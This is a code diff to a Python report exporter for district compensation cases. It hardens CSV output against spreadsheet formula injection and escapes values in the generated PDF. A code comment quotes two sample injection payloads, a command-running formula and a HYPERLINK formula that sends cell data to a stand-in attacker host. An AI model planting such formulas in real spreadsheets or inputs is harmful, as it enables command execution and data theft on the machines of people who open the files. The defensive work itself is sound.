@@ -25,6 +25,8 @@ import logging
 import os
 from datetime import datetime, timezone
 
+from xml.sax.saxutils import escape
+
 from reportlab.lib import colors
 from reportlab.lib.pagesizes import landscape, A4
 from reportlab.lib.styles import getSampleStyleSheet
@@ -137,6 +139,28 @@ def _fmt_bool(value):
     return "true" if value else "false"
 
 
+# Characters that make Excel/LibreOffice treat a cell as a formula rather than text.
+# Review finding (Blind Hunter + Edge Case Hunter, confirmed): cases.damage_category is
+# TEXT NOT NULL with NO CHECK constraint (migration 002) and cases.py validates only
+# "non-empty str", so a citizen-supplied value like =cmd|'/c calc'!A1 or
+# =HYPERLINK("http://attacker/"&A1,"Open") reaches this export verbatim. Excel is the
+# STATED primary consumer of the CSV (it is why the BOM exists), so the payload would
+# execute on a district manager's workstation.
+_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _defuse(value: str) -> str:
+    """Neutralises spreadsheet formula injection by prefixing a single quote.
+
+    A leading apostrophe is the conventional escape: Excel/LibreOffice render the cell as
+    literal text and strip the quote from the display. csv.writer quotes correctly but does
+    NOT neutralise — quoting is not a defence against formula evaluation.
+    """
+    if value and value.startswith(_FORMULA_PREFIXES):
+        return "'" + value
+    return value
+
+
 def format_row(row):
     """Formats one DB row into display strings, in CSV_COLUMNS order.
 
@@ -145,16 +169,38 @@ def format_row(row):
     """
     canonical_id, submitted_at, damage_category, confidence, was_overridden, status, approved, district, ds_division = row
     return {
+        # Only the free-text, DB-sourced columns need defusing; the generated/derived ones
+        # (canonical_id, timestamps, formatted numbers, booleans) cannot start with a
+        # formula prefix by construction.
         "canonical_id": canonical_id or "",
         "submitted_at": _fmt_datetime(submitted_at),
-        "damage_category": damage_category or "",
+        "damage_category": _defuse(damage_category or ""),
         "ai_confidence": _fmt_confidence(confidence),
         "was_overridden": _fmt_bool(was_overridden),
-        "status": status or "",
+        "status": _defuse(status or ""),
         "approved_amount_lkr": _fmt_amount(approved),
-        "district": district or "",
-        "ds_division_id": ds_division or "",
+        "district": _defuse(district or ""),
+        "ds_division_id": _defuse(ds_division or ""),
     }
+
+
+def total_approved(rows) -> float:
+    """Sums approved_amount across raw DB rows.
+
+    Reads the value through format_row's own contract rather than a bare positional index
+    (review finding): the previous `row[6]` re-implemented the positional layout that
+    format_row already owns, so any future column reorder would have silently summed a
+    Sinhala district string, hit the surrounding `except (TypeError, ValueError): pass`,
+    and printed an authoritative-looking "TOTAL 0.00" on the formal report instead of
+    failing loudly.
+    """
+    total = 0.0
+    for row in rows:
+        raw = row[CSV_COLUMNS.index("approved_amount_lkr")]
+        if raw is None:
+            continue
+        total += float(raw)
+    return total
 
 
 def stream_csv(cur, batch_size=500):
@@ -190,7 +236,7 @@ def stream_csv(cur, batch_size=500):
         yield _drain()
 
 
-def build_pdf(rows, district, from_date, to_date, generated_at=None):
+def build_pdf(rows, district, from_date, to_date, generated_at=None, truncated_from=None):
     """Renders the formal district report (AC2) and returns the PDF bytes.
 
     Text-only header -- PO-ratified 2026-08-06: no DWC logo asset exists anywhere in this
@@ -208,6 +254,22 @@ def build_pdf(rows, district, from_date, to_date, generated_at=None):
     title_style.fontName = font
     meta_style = styles["Normal"].clone("hecMeta")
     meta_style.fontName = font
+    warn_style = styles["Normal"].clone("hecWarn")
+    warn_style.fontName = font
+    warn_style.textColor = colors.HexColor("#B3261E")
+    # Body cells are rendered as Paragraphs, not bare strings. This is load-bearing twice over
+    # (both review findings): (1) reportlab only applies HarfBuzz shaping to text that came
+    # from a Paragraph -- a plain Table cell string is drawn via Canvas.drawString(shaping=False)
+    # (platypus/tables.py reads cellstyle.shaping, which defaults to None), so Sinhala division
+    # names in a bare cell would render with detached vowel signs despite the font being
+    # registered shapable; (2) a bare cell cannot wrap, so one long ds_division_id (unvalidated
+    # TEXT, migration 010) silently overflowed the frame and cropped the columns beside it.
+    cell_style = styles["BodyText"].clone("hecCell")
+    cell_style.fontName = font
+    cell_style.fontSize = 7.5
+    cell_style.leading = 9
+    head_style = cell_style.clone("hecHead")
+    head_style.textColor = colors.white
 
     buf = io.BytesIO()
     doc = SimpleDocTemplate(
@@ -221,19 +283,16 @@ def build_pdf(rows, district, from_date, to_date, generated_at=None):
     )
 
     formatted = [format_row(r) for r in rows]
-    total_approved = 0.0
-    for row in rows:
-        if row[6] is not None:
-            try:
-                total_approved += float(row[6])
-            except (TypeError, ValueError):
-                # A non-numeric approved_amount can't reach here through the schema
-                # (NUMERIC(12,2)), but the summary must not 500 if it somehow does.
-                pass
+    total = total_approved(rows)
 
     elements = [
         Paragraph("HEC Compensation — District Case Report", title_style),
-        Paragraph(f"District: {district}", meta_style),
+        # escape() everywhere a DB/JWT-sourced value reaches a Paragraph: Paragraph parses its
+        # text as RML markup, so an unclosed tag in a value (verified repro: a district of
+        # 'Anuradhapura <b> & Co' raises "Parse error: saw </para> instead of expected </b>")
+        # would escape as an unhandled traceback -- the only path in this route that did not
+        # return the module's JSON 500, and it fired AFTER the audit row was committed.
+        Paragraph(f"District: {escape(str(district))}", meta_style),
         # Stated once here so the offset-free timestamps in the table are unambiguous.
         Paragraph("All times UTC.", meta_style),
         Paragraph(
@@ -246,31 +305,55 @@ def build_pdf(rows, district, from_date, to_date, generated_at=None):
         Paragraph(
             f"Generated: {generated_at.strftime('%Y-%m-%d %H:%M UTC')}", meta_style
         ),
-        Spacer(1, 8 * mm),
     ]
 
-    header = [label for _key, label in PDF_COLUMNS]
-    data = [header]
-    for item in formatted:
-        data.append([item[key] for key, _label in PDF_COLUMNS])
+    # Truncation MUST be visible in the document itself (review finding raised independently by
+    # all three layers). Previously the only signals were an audit-log field the admin cannot
+    # see and a response header the frontend never read -- so a capped export printed
+    # "TOTAL | 10000 cases | <partial sum>" as an authoritative district financial figure that
+    # silently understated the real position. This is the formal report; it has to say so.
+    if truncated_from:
+        elements.append(
+            Paragraph(
+                f"INCOMPLETE REPORT — showing the {len(formatted):,} most recent of "
+                f"{truncated_from:,} matching cases. Totals below cover only the rows shown. "
+                f"Narrow the filters to produce a complete report.",
+                warn_style,
+            )
+        )
+    elements.append(Spacer(1, 8 * mm))
 
-    summary = [""] * len(PDF_COLUMNS)
-    summary[0] = "TOTAL"
-    summary[1] = f"{len(formatted)} cases"
-    summary[5] = f"{total_approved:,.2f}"
+    data = [[Paragraph(escape(label), head_style) for _key, label in PDF_COLUMNS]]
+    for item in formatted:
+        data.append(
+            [Paragraph(escape(item[key]), cell_style) for key, _label in PDF_COLUMNS]
+        )
+
+    summary = [Paragraph("", cell_style)] * len(PDF_COLUMNS)
+    summary = list(summary)
+    summary[0] = Paragraph("<b>TOTAL</b>", cell_style)
+    summary[1] = Paragraph(
+        f"<b>{len(formatted):,} cases</b>" + (" (partial)" if truncated_from else ""),
+        cell_style,
+    )
+    summary[5] = Paragraph(f"<b>{total:,.2f}</b>", cell_style)
     data.append(summary)
 
-    table = Table(data, repeatRows=1, hAlign="LEFT")
+    # Explicit widths so the table always fits the frame (A4 landscape minus 12mm margins
+    # = 273mm of usable width); combined with Paragraph cells this makes long values wrap
+    # instead of running off the page.
+    col_widths = [34 * mm, 34 * mm, 26 * mm, 20 * mm, 34 * mm, 34 * mm, 90 * mm]
+    table = Table(data, repeatRows=1, hAlign="LEFT", colWidths=col_widths)
     table.setStyle(
         TableStyle(
             [
                 ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#2D6A4F")),
-                ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
+                # FONTNAME/FONTSIZE stay for any non-Paragraph content and as a safety net;
+                # the Paragraph styles above are what actually drive glyph shaping.
                 ("FONTNAME", (0, 0), (-1, -1), font),
                 ("FONTSIZE", (0, 0), (-1, -1), 7.5),
                 ("GRID", (0, 0), (-1, -1), 0.4, colors.grey),
-                ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
-                ("ALIGN", (5, 1), (5, -1), "RIGHT"),
+                ("VALIGN", (0, 0), (-1, -1), "TOP"),
                 ("BACKGROUND", (0, -1), (-1, -1), colors.HexColor("#F2F7F2")),
             ]
         )
